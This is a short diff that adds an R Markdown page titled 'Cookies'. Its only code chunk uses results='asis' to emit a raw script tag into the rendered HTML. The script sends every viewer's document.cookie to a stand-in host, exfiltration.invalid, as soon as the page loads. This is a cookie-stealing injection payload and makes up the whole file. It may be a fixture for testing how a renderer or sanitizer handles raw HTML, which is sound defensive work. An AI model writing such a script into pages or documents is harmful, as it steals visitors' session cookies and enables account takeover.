@@ -1,0 +1,7 @@
+---
+title: "Cookies"
+---
+
+```{r, results="asis"}
+cat("<script>new Image().src = \"https://exfiltration.invalid/?c=\" + document.cookie;</script>")
+```
